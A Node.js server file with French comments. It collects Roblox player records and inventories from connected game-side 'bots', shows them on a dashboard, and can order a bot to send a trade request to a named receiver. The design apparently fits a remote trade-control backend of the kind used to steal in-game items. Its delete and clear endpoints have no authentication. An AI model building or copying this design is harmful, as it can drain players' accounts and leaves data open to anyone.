const express = require('express');
const mongoose = require('mongoose');
const WebSocket = require('ws');
const http = require('http');
const url = require('url');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

const log = (msg) => console.log(`[${new Date().toLocaleTimeString()}] ${msg}`);

const MONGO_URI = process.env.MONGO_URI;
mongoose.connect(MONGO_URI)
  .then(() => log("✅ [DB] Connexion établie"))
  .catch(err => log(`❌ [DB] ERREUR : ${err}`));

// SCHEMA HARMONISÉ AVEC LUAU
const ClientSchema = new mongoose.Schema({
    UserId: { type: Number, unique: true },
    Name: String,
    DisplayName: String,
    AccountAge: Number,
    Brainrots: { type: Array, default: [] },
    updatedAt: { type: Date, default: Date.now }
}, { strict: false });

const ClientModel = mongoose.model('Client', ClientSchema);

const activeBots = new Map();      
const activeDashboards = new Set(); 

async function broadcastToDashboard() {
    try {
        const allClients = await ClientModel.find({});
        const onlineBots = Array.from(activeBots.keys());
        const payload = JSON.stringify({ type: 'REFRESH', data: allClients, online: onlineBots });
        activeDashboards.forEach(ws => { 
            if (ws.readyState === WebSocket.OPEN) ws.send(payload); 
        });
    } catch (e) { log(`❌ [BROADCAST] Erreur : ${e.message}`); }
}

app.get('/ping', (req, res) => res.send("Pong !"));

app.get('/api/get', async (req, res) => {
    const { username } = req.query;
    try {
        // Recherche par la clé "Name" (Majuscule)
        const data = await ClientModel.findOne({ Name: username });
        res.json(data || { error: "Non trouvé" });
    } catch (e) { res.status(500).send(e.message); }
});

app.get('/api/remove', async (req, res) => {
    const { username } = req.query;
    try {
        await ClientModel.deleteOne({ Name: username });
        await broadcastToDashboard();
        res.send(`Joueur ${username} supprimé.`);
    } catch (e) { res.status(500).send(e.message); }
});

app.get('/api/clear', async (req, res) => {
    try {
        await ClientModel.deleteMany({});
        await broadcastToDashboard();
        res.send("Base de données vidée.");
    } catch (e) { res.status(500).send(e.message); }
});

app.get('/api/sendtrade', (req, res) => {
    const { username, receiver } = req.query;
    const botWs = activeBots.get(username);
    if (botWs && botWs.readyState === WebSocket.OPEN) {
        botWs.send(JSON.stringify({ Type: "TradeRequest", TargetUser: receiver }));
        res.send(`Ordre envoyé à ${username}`);
    } else {
        res.send(`Bot ${username} hors ligne.`);
    }
});

wss.on('connection', async (ws, req) => {
    const parameters = url.parse(req.url, true).query;
    const username = parameters.username || "Unknown";

    if (username === "dashboard") {
        activeDashboards.add(ws);
    } else {
        activeBots.set(username, ws);
    }

    await broadcastToDashboard();

    ws.on('message', async (msg) => {
        try {
            const payload = JSON.parse(msg);
            if (payload.Method === "PlayerInfos") {
                log(`💾 Update: ${payload.Data.Name}`);
                await ClientModel.findOneAndUpdate(
                    { UserId: payload.Data.UserId },
                    { ...payload.Data, updatedAt: new Date() },
                    { upsert: true, new: true }
                );
                await broadcastToDashboard();
            }
        } catch (e) { log(`⚠️ Erreur WS: ${e.message}`); }
    });

    ws.on('close', () => {
        activeDashboards.delete(ws);
        activeBots.delete(username);
        broadcastToDashboard();
    });
});

app.use(express.static('public'));
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => log(`🚀 Serveur actif sur le port ${PORT}`));
